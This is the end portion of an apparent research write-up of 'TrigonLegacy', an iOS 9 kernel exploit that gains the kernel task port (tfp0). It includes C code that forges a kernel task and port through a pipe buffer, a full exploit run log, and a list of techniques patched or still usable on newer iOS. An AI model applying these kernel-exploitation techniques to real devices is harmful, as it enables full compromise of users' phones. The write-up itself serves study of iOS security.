kern_return_t task_conversion_eval(task_t caller, task_t victim)
{
  /*
    * Tasks are allowed to resolve their own task ports, and the kernel is
    * allowed to resolve anyone's task port.
    */
  if (caller == kernel_task) {
    return KERN_SUCCESS;
  }

  if (caller == victim) {
    return KERN_SUCCESS;
  }

  /*
    * Only the kernel can can resolve the kernel's task port. We've established
    * by this point that the caller is not kernel_task.
    */
  if (victim == kernel_task) {
    return KERN_INVALID_SECURITY;
  }

  /*
    * On embedded platforms, only a platform binary can resolve the task port
    * of another platform binary.
    */
  if ((victim->t_flags & TF_PLATFORM) && !(caller->t_flags & TF_PLATFORM)) {
    return KERN_INVALID_SECURITY;
  }

  return KERN_SUCCESS;
}
```
<figcaption>task_conversion_eval</figcaption>
</figure>

This check verifies if the task port we're trying to resolve is the kernel task's task port, but this check is a **pointer** check. Which means we can bypass it by just remapping/faking the kernel task structure. This is not needed for TrigonLegacy since we're targeting iOS 9, but a bypass for this is nevertheless partially implemented, both for study purposes and in case future support for newer versions is to be implemented. 

```c
/**
We need kalloc
We have kalloc at home
kalloc at home:
*/
    
int p[2];
int ret = pipe(p);
write(p[1], fake_task, sizeof(ktask_t));
// find pipebuffer containing our fake task
uint64_t our_proc = early_rk64(self_task + 0x2f0); // KSTRUCT_OFFSET_TASK_BSD_INFO
uint64_t p_fd = early_rk64(our_proc + 0xf0); // 0xF0 for 9.0, 0x108 for 9.1 and 9.2
uint64_t fd_ofiles = early_rk64(p_fd + 0x0); // FD_OFILES
    
uint64_t fproc = early_rk64(fd_ofiles + p[0] * sizeof(uint64_t));
uint64_t f_fglob = early_rk64(fproc + 0x8); // the pipe
uint64_t fg_data = early_rk64(f_fglob + 0x38); // pipe (pipebuf is 0x0)
printf("Pipe data: %llx\n", fg_data);
uint64_t fake_task_addr = early_rk64(fg_data + 0x10); // pipebuf buffer
printf("Fake task addr: %llx\n", fake_task_addr);

pipe_write_32(port_addr + 0x0, IO_BITS_ACTIVE | IKOT_TASK);
pipe_write_32(port_addr + 0x4, 0xf00d);
pipe_write_32(port_addr + dev_info->kstruct_offsets.ipc_port_ip_srights, 0xf00d);
pipe_write_64(port_addr + dev_info->kstruct_offsets.ipc_port_ip_receiver, ipc_space_kernel);
pipe_write_64(port_addr + dev_info->kstruct_offsets.ipc_port_ip_kobject, fake_task_addr);
```

We simply abuse a pipe's pipebuf buffer as a means for getting our controlled fake task into kernel space. For the devices our exploit currently supports this wouldn't even be necessary, even in iOS 10.3 since `PAN` was only introduced in A10. We could simply use `malloc` to allocate some memory and write its address into `IP_KOBJECT` and it would happily dereference a userland address.

TFP0 would end up being used up to iOS 13, with Apple finally killing tfp0 with iOS 14 with `convert_port_to_map_with_flavor` checking if the task's map is backed by the `kernel_pmap`.
</details>

## Conclusion

With this, we're wrapping up TrigonLegacy, a **deterministic** kernel exploit which is able to get you `TFP0` in **under 10ms**. TrigonLegacy has been run over 500000 times in testing, in various settings, while idle or while running CPU intensive tasks and not once has it failed and not once has the exploit crashed a device. 

<details markdown="1">
<summary>TrigonLegacy full run</summary>
<figure markdown="1">
```c
iOS version: 9.3.2
IOSurface for PurpleGfxMem: 0x15d600310
Created parent entry under PurpleGfxMem
Created large memory entry
Found sleep token buffer base at 0x720000
Mapping base is 0x87e058000
TZ0 start isn't DRAM base: 0x87e800000, returning minimum guess
Physical Kernel base (guessed): 0x800004000
Physical slide step: 0x200000
Physical Kernel base 0x800804000, Offset from mapping base 0x7d854000
(Static) Virtual Kernel Base 0xffffff8020804000
Bootargs phys is 0x802688000
cpu_ttep is 0x8026c4000
client: 1307, (os/kern) successful
newSurface: 0x15d600310, id: 29
setNotify: (os/kern) successful
incrementUseCount done
decrementUseCount done
mach_msg: (os/kern) successful
TFP0 port addr: 0xffffff8003adab60
Receiver: 0xffffff80026a2140
Self task: 0xffffff80026f6410
Self proc: 0xffffff8002f00ef8
Pipe 1: 0xffffff800327a098
Pipe 2: 0xffffff8003279ad8
Is table: 0xffffff8004a41600
Self port addr: 0xffffff8003adad40
IPC space kernel: 0xffffff80026a1f80
ITK bootstrap: 0xffffff8002a2b560
Launchd itk space: 0xffffff80026a1f40
Launchd task: 0xffffff80026f4ca0
Found kernel task! (pid 0) curr_task: 0xffffff80026f5150
Kernel task: 0xffffff80026f5150
Is table: 0xffffff8004a41600
tfp0: 1203
Time taken for tfp0: 8.539 ms
```
</figure>
</details>

This writeup went through a lot, but hopefully it explained the way TrigonLegacy ultimately achieved tfp0 in an easy to understand way, and also some insight on how the iOS kernel mitigations have evolved over time.
To wrap up, here's what's still usable in newer iOS versions and what was patched along the way.

**Patched:**
- Seatbelt special port trick was patched with 10.3
- TFP0 no longer usable since iOS 14
- Trigon patched 16.5.1
- PipeRW patched somewhere in iOS 14
- Predictable cpu_ttep location

**Still usable:**
- We're still allowed to use and map under `PurpleGfxMem`
- MMIO is still mappable given you have an arbitrary physical mapping primitive
- Finding `kernel_task` from `itk_bootstrap`
- Sleep token buffer base still at a fixed location as of the latest iOS versions available for these devices

In case you have any doubts, questions or if you simply want to chat, you can get in contact with me over [X (Twitter)](https://x.com/imnotclarity) at @imnotclarity or [Discord](https://discord.com/) (@notclarity). I'm also available through email at [therealclarity@protonmail.com](mailto:therealclarity@protonmail.com).
